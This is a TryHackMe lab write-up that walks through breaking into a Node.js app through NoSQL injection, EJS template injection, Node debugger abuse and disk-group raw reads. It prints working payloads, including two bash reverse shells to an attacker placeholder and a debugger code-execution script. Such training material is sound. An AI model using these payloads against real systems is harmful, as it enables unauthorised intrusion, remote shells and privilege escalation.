# Do Not Disturb — TryHackMe Writeup

> **Room:** [Do Not Disturb](https://tryhackme.com/room/donotdisturb) · **Difficulty:** Medium
> **Category:** Web / Boot2Root (Node.js)
> **Author of writeup:** 0xnyx
> **Goal:** Break into a Node.js web app, pivot between service accounts, and reach root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/donotdisturb), **no flags or passwords are included** — only the method.

---

## How to read this writeup

Each step is **Do** (the command) → **You get** (what comes back) → **Why / what next** (what it means and where it leads). The whole box is a chain of four footholds, each one a different user.

---

## Step 1 — Port scan

**Do** — Version scan. `-Pn` skips ping (THM blocks it).

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh   OpenSSH ...
80/tcp open  http  ... Node.js (Express) ... "Byte Lotus — Poolside"
```

**Why / what next** — The web server is **Express (Node.js)**, not PHP/Apache. That single fact changes which bugs we hunt for: Node apps are prone to **NoSQL injection** (MongoDB) and **SSTI** (template injection), not classic SQLi. Keep that in mind.

---

## Step 2 — Authentication bypass (NoSQL injection)

**Do** — The site has a login form that POSTs `username` + `password` to `/login`. Express's body parser turns bracketed keys like `password[$ne]` into a nested object `{ password: { $ne: ... } }`. If the app passes that straight into a MongoDB query, we can inject an **operator** instead of a value.

```bash
# password[$ne]=x   means   { password: { $ne: "x" } }   =  "password is NOT equal to x"  = matches ANY password
curl -s -i -X POST http://<TARGET>/login \
  --data-urlencode "username=<STAFF_USER>" \
  --data-urlencode 'password[$ne]=x'
```

**You get**

```
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: session=...
```

**Why / what next** — The `302 → /staff` plus a session cookie means we logged in **without knowing the password** — the `$ne` operator made the password check always true. (If you don't know the staff username, the login form's placeholder text or testing a couple of obvious names reveals which one returns a `/staff`-level session.) Now we're inside the staff console. Next: look for a feature that processes our input dangerously.

---

## Step 3 — RCE via SSTI (EJS template injection)

**Do** — The `/staff` console has a "confirmation template" field. The app renders it with **EJS**, so `<%= ... %>` is evaluated as server-side JavaScript. EJS can reach Node's internals through `process.mainModule.require`. First prove code execution:

```
<%= process.mainModule.require("child_process").execSync("id") %>
```

**You get** — The rendered page echoes back something like `uid=1000(poolside) ...` — the output of `id`, run on the server.

**Why / what next** — That's **Remote Code Execution** as the `poolside` service account. Turn it into a real shell with a reverse-shell payload (start a listener `nc -lvnp <PORT>` first):

```
<%= process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1"') %>
```

The **user flag** is in `poolside`'s home directory. But `poolside` is a low-priv service account — we need to move up. Next: enumerate what else is running on the box.

---

## Step 4 — Lateral movement (Node `--inspect` debugger abuse)

**Do** — After any shell, always list running processes and listening ports to find other services.

```bash
ps aux | grep node
ss -ltnp | grep 9229
```

**You get**

```
<otheruser>  node --inspect=127.0.0.1:9229 processor.js
LISTEN  127.0.0.1:9229
```

**Why / what next** — A Node process started with `--inspect` opens the **Chrome DevTools debugger** on port 9229. Anyone who can reach that port can execute JavaScript **inside that process** — i.e. as whichever user owns it. It's bound to localhost, but we're already on the box, so we can reach it. This is a free pivot to another user.

**Do** — Get the debugger's WebSocket URL, then send a `Runtime.evaluate` with a reverse shell. Run this with the target's own `node` (Node 22 has a built-in `WebSocket`):

```bash
curl -s http://127.0.0.1:9229/json      # -> copy the "webSocketDebuggerUrl"
```

```js
const j = await (await fetch('http://127.0.0.1:9229/json')).json();
const ws = new WebSocket(j[0].webSocketDebuggerUrl);
ws.onopen = () => ws.send(JSON.stringify({id:1, method:'Runtime.evaluate', params:{
  expression: "process.mainModule.require('child_process')"
    + ".exec('bash -c \"bash -i >& /dev/tcp/<ATTACKER>/<PORT2> 0>&1\"')"
}}));
```

> **Gotcha:** plain `require` is undefined in the eval context — always use `process.mainModule.require`.

**You get** — A new reverse shell, this time as the account running `processor.js` (the pipeline service account).

**Why / what next** — We've pivoted to a second, more privileged user. Now check whether *this* user has a path to root.

---

## Step 5 — Privilege escalation to root (raw disk access)

**Do** — Check this user's groups and look for raw block-device access.

```bash
id                      # look for the 'disk' group
ls -l /dev/sd*          # which block device is the root filesystem?
```

**You get** — The user is in the **`disk`** group (or can otherwise use `debugfs` on `/dev/sdXN`).

**Why / what next** — Membership of the `disk` group means you can read the **raw hard disk** directly, byte for byte. File permissions live *inside* the filesystem, but reading the raw device bypasses them entirely — so you can read any file on the box, including `/root`, with no SUID binary and no sudo.

**Do** — Use `debugfs` (a filesystem debugger) to read root's flag straight off the device ([GTFOBins: debugfs](https://gtfobins.github.io/gtfobins/debugfs/)):

```bash
debugfs -R 'cat /root/root.txt' /dev/sdXN
```

**You get** — The **root flag**, read directly from the raw device.

**Why / what next** — Done. The flag even hints at the lesson: *raw disk access was too much power to hand a service account.*

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | Identified Express/Node stack |
| 2 | NoSQL injection (`password[$ne]`) | Logged in without password |
| 3 | EJS SSTI | RCE as `poolside` (user flag) |
| 4 | Node `--inspect` (CDP) abuse | Pivot to pipeline user |
| 5 | `disk` group / `debugfs` | Root flag |

## Lessons

- Express + bracketed params → always test **NoSQL operator injection** (`[$ne]`, `[$gt]`, `[$regex]`).
- Any template field (EJS/Handlebars/Jinja) is a candidate for **SSTI → RCE**.
- After every shell, run `ps aux`, `ss -ltnp`, `id`, `hostname` — a localhost `--inspect` port is a free pivot; a hex hostname means Docker.
- The **`disk` group / `debugfs`** is a root-equivalent primitive (read any file via the raw block device).

## Remediation

- Use parameterized queries and reject non-string auth parameters.
- Never render user input as a template; sandbox or avoid server-side templating of untrusted data.
- Never expose `--inspect` on a production service.
- Don't add service accounts to the `disk` group.

---

*Write-up for [TryHackMe — Do Not Disturb](https://tryhackme.com/room/donotdisturb).*
